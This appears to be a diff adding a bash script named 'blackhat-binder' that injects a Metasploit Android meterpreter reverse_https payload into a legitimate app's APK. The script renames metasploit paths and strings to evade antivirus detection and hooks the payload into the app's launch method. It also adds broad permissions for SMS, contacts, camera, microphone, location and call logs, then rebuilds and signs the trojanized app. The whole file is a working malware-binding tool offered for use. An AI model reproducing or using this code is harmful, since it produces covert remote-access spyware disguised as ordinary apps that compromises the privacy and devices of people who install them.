@@ -1,0 +1,227 @@
+#!/bin/bash
+
+# Author: mranonymous
+# Filename: blackhat-binder
+# Purpose: AV Evasion along with injecting a meterpreter payload into another apk file
+ 
+
+if [ $# -lt 2 ] || [ ${1: -4} != ".apk" ] || [ ${2: -4} != ".apk" ]; then
+    echo
+    echo "-------------ERROR------------"
+    echo "Please pass in a msfvenom generated .apk file followed by the .apk you want to inject it into"
+    echo "msfvenom -p android/meterpreter/reverse_https LHOST=<IP> LPORT=<PORT> -o payload.apk"
+    echo "Ex: blackhat-binder payload.apk com.originalApp.apk"
+    echo "-----------------------------------------"
+    exit 1
+fi
+
+#Checking if apktool is available. If not, it will handle obtaining it and moving it to the user's path.
+type apktool.jar >/dev/null 2>&1 || { 
+   echo -e "\033[34m ApkTool dependency needed... downloading \x1B[0m"
+   echo;
+   wget https://bitbucket.org/iBotPeaches/apktool/downloads/apktool_2.2.2.jar
+   mv apktool_2.2.2.jar apktool.jar
+   chmod +x apktool.jar
+   mv apktool.jar /usr/local/bin/.
+}
+
+# Variables
+fullPathPayload=$1
+fullPathOriginal=$2
+payloadApk=$(basename $fullPathPayload)
+originalApk=$(basename $fullPathOriginal)
+VAR1=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
+VAR2=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # smali dir renaming
+VAR3=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Payload.smali renaming
+VAR4=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 1
+VAR5=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 2
+VAR6=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # Pakage name renaming 3
+VAR7=`cat /dev/urandom | tr -cd 'a-z' | head -c 10` # New name for word 'payload'
+
+JAR=`which apktool.jar`
+
+smaliFile=""
+lineNumber=""
+
+#APKTool to pull apart the package
+java -jar $JAR d -f -o /tmp/payload $fullPathPayload
+java -jar $JAR d -f -o /tmp/original $fullPathOriginal
+
+#Changing the default folder and filenames being flagged by AV
+mv /tmp/payload/smali/com/metasploit /tmp/payload/smali/com/$VAR1
+mv /tmp/payload/smali/com/$VAR1/stage /tmp/payload/smali/com/$VAR1/$VAR2
+mv /tmp/payload/smali/com/$VAR1/$VAR2/Payload.smali /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+
+#Exit the script if an older payload was generated. PayloadTrustManager.smali is a file only found in older versions.
+if [ -f /tmp/payload/smali/com/$VAR1/$VAR2/PayloadTrustManager.smali ]; then
+    echo
+    echo -e "\033[31m An old version of the msfvenom generated payload was detected. Make sure you have everything compeltely updated in Kali! \n\n Older payloads have not been configured in this script to bypass AV. With that, this script still results in a 1/35 on nodistribute.com for the old payloads, but it is not recommended to continue. \x1B[0m"
+    echo
+    exit 1
+fi
+
+#Updating path in .smali files
+sed -i "s#/metasploit/stage#/$VAR1/$VAR2#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
+sed -i "s#Payload#$VAR3#g" /tmp/payload/smali/com/$VAR1/$VAR2/*
+
+#Flagged by AV, changed to something not as obvious
+sed -i "s#com.metasploit.meterpreter.AndroidMeterpreter#com.$VAR4.$VAR5.$VAR6#" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+sed -i "s#payload#$VAR7#g" /tmp/payload/smali/com/$VAR1/$VAR2/$VAR3.smali
+
+#copy over payload files into the original apk files
+cp -r /tmp/payload/smali/com/$VAR1 /tmp/original/smali/com/.
+
+#locate the launcher .smali. We are looking for the MAIN being called directly before LAUNCHER. We then take this line number and begin looping backwards through the file to find the android name of the .smali file we need to inject into.
+lineNumber=`grep -n -A 1 android.intent.action.MAIN /tmp/original/AndroidManifest.xml | grep android.intent.category.LAUNCHER | cut -d- -f1`
+let lineNumber-=1
+echo
+echo -e "\033[34m Line number of AndroidManifest.xml MAIN: $lineNumber \x1B[0m"
+echo
+until [  $lineNumber -lt 2 ] || [[ ! -z "${smaliFile// }" ]]; do
+    smaliFile=`sed -n "$lineNumber p" /tmp/original/AndroidManifest.xml | grep android:label=\"@string/app_name\" | grep android:name=\"`
+    let lineNumber-=1
+done
+echo -e "\033[34m $smaliFile \x1B[0m"
+echo
+echo -e "\033[34m Left until loop at line number: $lineNumber \x1B[0m"
+echo
+echo $smaliFile > /tmp/output
+grep -o -P '(?<=android:name=").*(?=")' /tmp/output | awk 'NR==1{print $1}' > /tmp/output_1  		# grabs just what we need from the string 
+sed -i 's#"##' /tmp/output_1							# Gets rid of extra quote
+sed -i 's/\./\//g' /tmp/output_1                        			# Replaces all "." with "/"
+sed -i 's/[ \t]*$//' /tmp/output_1                  
+launcherSmali=`cat /tmp/output_1`.smali                 			# Stores the result as a variable and appends ".smali"
+cat /tmp/output_1	#for debugging
+echo $launcherSmali	#for debugging
+
+#Check if automatic searching worked. If not, then prompt the user to allow manual entry.
+#Check if no recorded output OR if the file it thinks is correct is actually present.
+if [ \! -s /tmp/output_1 ] || [ ! -f /tmp/original/smali/$launcherSmali ] ; then 
+    echo; echo
+    echo -e "\033[33m Running grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml \x1B[0m"
+    echo -e "\033[33m This is to assist in manually finding the smali file to inject into \x1B[0m"
+    echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    # a little visual aid to find the .smali file easily without manually navigating
+    grep -B 7 -A 2 -n MAIN /tmp/original/AndroidManifest.xml 
+    echo ++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
+    echo;echo
+    echo -e "\033[31m Was unable to locate the .smali launcher in AndroidManifest.xml with the current grep command in place \x1B[0m"
+    echo "Locate MAIN/LAUNCHER functions in /tmp/original/AndroidManifest.xml. Above you will find the path to the .smali file"
+    echo
+    echo -e "\033[33m Example prompt input: smali/com/path1/path2/MainActivity.smali \x1B[0m"
+    read -p 'Location of MAIN/LAUNCHER .smali file: ' launcherSmali
+    if [ ! -f /tmp/original/$launcherSmali ]; then
+        echo -e "\033[31m Was unable to locate the .smali file. Please verify the path manually to the .smali file is present in the /tmp/original/<smali> directory. Also, be sure to include the .smali file extension in the prompt.\x1B[0m"
+	echo -e "\033[34m It is good to navigate through the .smali file structure to verify the file is actually present if you are running into issues. \x1B[0m"
+	exit 1
+    else
+	echo -e "\033[32m Located the given smali file \x1B[0m"
+    fi
+else
+    echo
+    echo -e "\033[32m Found smali in AndroidManifest.xml: $launcherSmali \x1B[0m"
+    launcherSmali=smali/$launcherSmali
+fi
+
+#add invoke to launching .smali file to call the payload upon app launch
+sed -i "/method.*onCreate(/ainvoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali
+
+#add all permissions... because, why not?
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SET_WALLPAPER\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.INTERNET\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CHANGE_WIFI_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_NETWORK_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_COARSE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.ACCESS_FINE_LOCATION\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_PHONE_STATE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.SEND_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CALL_PHONE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CONTACTS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECORD_AUDIO\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_SETTINGS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.CAMERA\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_SMS\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_EXTERNAL_STORAGE\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.RECEIVE_BOOT_COMPLETED\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.READ_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WRITE_CALL_LOG\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/platformBuildVersionName/a \    <uses-permission android:name=\"android.permission.WAKE_LOCK\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.camera.autofocus\"/>" /tmp/original/AndroidManifest.xml
+sed -i "/SET_WALLPAPER/a \    <uses-feature android:name=\"android.hardware.microphone\"/>" /tmp/original/AndroidManifest.xml
+
+#Check to see if the invoke command was inserted before compiling
+if  grep -q "invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V" /tmp/original/$launcherSmali ; then
+    echo; echo -e "\033[32m Successfully injected the payload and invoke was inserted into the launching .smali file. \x1B[0m"
+    echo
+else
+    echo
+    echo -e "\033[31m Failed to inject the invoke method into the onCreate method in /tmp/original/$launcherSmali . This may be because the developer used a non-standard function name. \x1B[0m"
+    echo
+    echo -e "\033[33m You can finish this manually by adding 'invoke-static {p0}, Lcom/$VAR1/$VAR2/$VAR3;->start(Landroid/content/Context;)V' to the method that is called upon app launching in the file still present on disk: /tmp/original/$launcherSmali. Once you have did this, then all that you have left to do is build the package with APKTool and sign. "
+    echo
+    echo -e "\033[33m To build use: java -jar $JAR b /tmp/original \x1B[0m"
+    echo
+    echo -e "\033[33m This places the package in /tmp/original/dist \x1B[0m"
+    echo
+    echo -e "\033[33m To sign: 'jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA /tmp/original/dist/$originalApk androiddebugkey' \x1B[0m"
+    echo;echo
+    exit 1
+fi
+
+#Rebuild the package using APKTool
+java -jar $JAR b /tmp/original
+echo; 
+echo -e "\033[34m Verifying ApkTool was able to compile the modified original package. \x1B[0m"
+echo
+
+#Check if the injected file was successful in being created
+if [ ! -f /tmp/original/dist/$originalApk ]; then
+    echo -e "\033[31m There was a problem in the creation of the injected APK file. Review the output to see where the issue was. Also, review /tmp/original files to see what could have potentially caused APKTool to fail.\x1B[0m"
+    echo -e "\033[33m Attempt to decompile and build the .apk file using apktool manually to see if it is successful before any modifications take place. \x1B[0m"
+    echo -e "\033[33m Ex: java -jar /usr/local/bin/apktool.jar d -f -o outputfolder <com.object>.apk ; java -jar /usr/local/bin/apktool.jar b outputfolder \x1B[0m"
+    rm -rf /tmp/payload
+    #rm -rf /tmp/original
+    rm /tmp/output
+    rm /tmp/output_1
+    exit 1
+fi
+
+#Rename and move the injected file to the current working directory
+echo -e "\033[34m Injected package created: `pwd`/injected_$originalApk \x1B[0m"
+echo -e "\033[34m Moving the injected package to the current directory \x1B[0m"
+mv /tmp/original/dist/$originalApk binded_$originalApk
+
+#Signing the package
+echo -e "\033[34m Checking for ~/.android/debug.keystore for signing \x1B[0m"
+if [ ! -f ~/.android/debug.keystore ]; then
+    echo
+    echo "Debug key not found. Generating one now."
+    echo
+    if [ ! -d "~/.android" ]; then
+      mkdir ~/.android
+    fi
+    keytool -genkey -v -keystore ~/.android/debug.keystore -storepass android -alias androiddebugkey -keypass android -keyalg RSA -keysize 2048 -validity 10000
+fi
+echo;
+echo -e "\033[34m Attempting to sign the package with your android debug key \x1B[0m"
+echo
+jarsigner -keystore ~/.android/debug.keystore -storepass android -keypass android -digestalg SHA1 -sigalg MD5withRSA binded_$originalApk androiddebugkey
+echo
+echo -e "\033[34m Signed the .apk file with ~/.android/debug.keystore \x1B[0m"
+echo -e "\033[34m Simply remove the debug.keystore file and re-run the program to be prompted to create a new debug key \x1B[0m"
+echo
+echo -e "\033[34m Cleaning up \x1B[0m"
+rm -rf /tmp/payload
+rm -rf /tmp/original
+rm /tmp/output
+rm /tmp/output_1
+echo
+echo -e "\033[32m Successfully Binded, But this app is detectable BY antivirus + google play protect, Visit link below to see how to make it UNDETECTABLE! \x1B[0m"
+echo
+echo -e "\033[36m Make it UNDETECTABLE visit this <LINK> \x1B[0m"
+echo -e "\033[36m By MR@AnonyMoUS-TANZANIA~~2019 \x1B[0m"
